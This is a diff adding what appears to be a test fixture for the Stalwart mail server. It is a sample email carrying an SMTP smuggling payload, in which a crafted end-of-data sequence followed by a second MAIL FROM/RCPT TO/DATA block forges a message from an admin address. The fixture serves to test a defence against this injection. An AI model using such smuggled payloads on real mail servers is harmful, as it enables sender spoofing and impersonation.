@@ -1,0 +1,29 @@
+Received: from client1.foobar.net  [192.0.2.1]
+      by submitserver.foobar.net with SUBMISSION;
+      Fri, 11 Jul 2003 21:01:54 -0700 (PDT)
+From: Joe SixPack <john@foobar.net>
+To: Suzie Q <suzie@foobar.org>
+Subject: Is dinner ready?
+Date: Fri, 11 Jul 2003 21:00:37 -0700 (PDT)
+Message-ID: <20030712040037.46341.5F8J@foobar.net>
+
+Hi.
+
+We lost the game. Are you hungry yet?
+
+Joe.
+
+The below example crafts "\r.\nMAIL FROM:" as stalwart will replace "\n"
+with "\r\n", leaving us with "\r.\r\nMAIL FROM:".
+
+.
+MAIL FROM:<admin@foobar.net>
+RCPT TO:<ok@foobar.org>
+DATA
+From: Joe SixPack <admin@foobar.net>
+To: Suzie Q <suzie@foobar.org>
+Subject: I am the admin.
+Date: Fri, 11 Jul 2003 21:00:37 -0700 (PDT)
+Message-ID: <20030712040037.46341.5F8K@foobar.net>
+
+I am the admin now!
